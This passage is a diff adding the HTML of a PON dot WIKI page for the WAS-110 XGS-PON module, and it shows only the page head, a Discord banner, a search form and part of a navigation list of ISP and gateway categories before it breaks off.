@@ -1,0 +1,5242 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="We're unlocking the FTTP edge with the freedom of choice through shared knowledge and open standards while empowering SOHO operators by kicking the ISP CPE to the curb">
+      
+      
+      
+        <link rel="canonical" href="https://pon.wiki/xgs-pon/ont/bfw-solutions/was-110/">
+      
+      
+        <link rel="prev" href="../../../">
+      
+      
+        <link rel="next" href="../../calix/100-05610/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14+insiders-4.53.16">
+    
+    
+      
+        <title>WAS-110 - PON dot WIKI</title>
+      
+    
+    
+  
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.8cce3a28.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+  <link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css"
+  />
+
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-YLNP9LG92G"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-YLNP9LG92G",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-YLNP9LG92G",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>if("undefined"!=typeof __md_analytics){var consent=__md_get("__consent");consent&&consent.analytics&&__md_analytics()}</script>
+  
+
+    
+    
+   <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>
+    html.glightbox-open { overflow: initial; height: 100%; }
+    .gslide-title { margin-top: 0px; user-select: text; }
+    .gslide-desc { color: #666; user-select: text; }
+    .gslide-image img { background: white; }
+    .gscrollbar-fixer { padding-right: 15px; }
+    .gdesc-inner { font-size: 0.75rem; }
+    body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color);}
+    body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color);}
+    body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color);}</style> <script src="../../../../assets/javascripts/glightbox.min.js"></script></head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#was-110" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+        <aside class="md-banner">
+          <div class="md-banner__inner md-grid md-typeset">
+            
+              <button class="md-banner__button md-icon" aria-label="Don't show this again">
+                
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+              </button>
+            
+            
+  Join the 8311 community on 
+  <a href="https://discord.com/servers/8311-886329492438671420" target="_blank" rel="noopener">
+    <span class="twemoji discord">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M524.531 69.836a1.5 1.5 0 0 0-.764-.7A485 485 0 0 0 404.081 32.03a1.82 1.82 0 0 0-1.923.91 338 338 0 0 0-14.9 30.6 447.9 447.9 0 0 0-134.426 0 310 310 0 0 0-15.135-30.6 1.89 1.89 0 0 0-1.924-.91 483.7 483.7 0 0 0-119.688 37.107 1.7 1.7 0 0 0-.788.676C39.068 183.651 18.186 294.69 28.43 404.354a2.02 2.02 0 0 0 .765 1.375 487.7 487.7 0 0 0 146.825 74.189 1.9 1.9 0 0 0 2.063-.676A348 348 0 0 0 208.12 430.4a1.86 1.86 0 0 0-1.019-2.588 321 321 0 0 1-45.868-21.853 1.885 1.885 0 0 1-.185-3.126 251 251 0 0 0 9.109-7.137 1.82 1.82 0 0 1 1.9-.256c96.229 43.917 200.41 43.917 295.5 0a1.81 1.81 0 0 1 1.924.233 235 235 0 0 0 9.132 7.16 1.884 1.884 0 0 1-.162 3.126 301.4 301.4 0 0 1-45.89 21.83 1.875 1.875 0 0 0-1 2.611 391 391 0 0 0 30.014 48.815 1.86 1.86 0 0 0 2.063.7A486 486 0 0 0 610.7 405.729a1.88 1.88 0 0 0 .765-1.352c12.264-126.783-20.532-236.912-86.934-334.541M222.491 337.58c-28.972 0-52.844-26.587-52.844-59.239s23.409-59.241 52.844-59.241c29.665 0 53.306 26.82 52.843 59.239 0 32.654-23.41 59.241-52.843 59.241m195.38 0c-28.971 0-52.843-26.587-52.843-59.239s23.409-59.241 52.843-59.241c29.667 0 53.307 26.82 52.844 59.239 0 32.654-23.177 59.241-52.844 59.241"/></svg>
+    </span>
+    <strong>Discord</strong>
+  </a>
+
+          </div>
+          
+            <script>var el=document.querySelector("[data-md-component=announce]");if(el){var content=el.querySelector(".md-typeset");__md_hash(content.innerHTML)===__md_get("__announce")&&(el.hidden=!0)}</script>
+          
+        </aside>
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="PON dot WIKI" class="md-header__button md-logo" aria-label="PON dot WIKI" data-md-component="logo">
+      
+  <img src="../../../../assets/images/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PON dot WIKI
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              WAS-110
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/up-n-atom/8311" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    up-n-atom/8311
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../.." class="md-tabs__link">
+          
+  
+  
+    
+  
+  GUIDES
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../gpon/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  GPON
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  XGS-PON
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../discord/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  DISCORD
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../on-the-web/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  ON THE WEB
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="PON dot WIKI" class="md-nav__button md-logo" aria-label="PON dot WIKI" data-md-component="logo">
+      
+  <img src="../../../../assets/images/logo.svg" alt="logo">
+
+    </a>
+    PON dot WIKI
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/up-n-atom/8311" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    up-n-atom/8311
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../.." class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GUIDES
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_1" id="__nav_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    GUIDES
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2024/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2024
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2025
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Categories
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Categories
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/att/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AT&amp;T
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bbox/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BBox
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bfw-solutions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BFW Solutions
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bgw320-500/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BGW320-500
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bgw320-505/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BGW320-505
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bgw620-700/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    BGW620-700
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bell-aliant/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bell Aliant
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bell-canada/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bell Canada
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bell-icg/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bell ICG
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bell-mts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bell MTS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bouygues-sa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bouygues S.A.
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/bridge-mode/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Bridge Mode
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/cig/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CIG
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/f5685lgb-vmb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    F5685LGB-VMB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fast-5685/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAST 5685
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fast-5688b/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAST 5688b
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fast-5689/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAST 5689
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fast-5689e/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAST 5689E
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fast-5694/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAST 5694
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fast-5698/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FAST 5698
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/fox222/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FOX222
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/frx523/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FRX523
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/frontier/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Frontier
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/funbox-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Funbox 10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/giga-hub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Giga Hub
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/home-hub-4000/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home Hub 4000
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/hub-5x/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hub 5x
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/humax/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Humax
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/lightspeed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lightspeed
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/livebox-7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Livebox 7
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/nh20a/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NH20A
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/nh20t/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NH20T
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/nokia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nokia
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/orange-polska-sa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Orange Polska S.A.
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/orange-sa/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Orange S.A.
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/rogers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Rogers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/sagemcom/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sagemcom
+  
+
+    
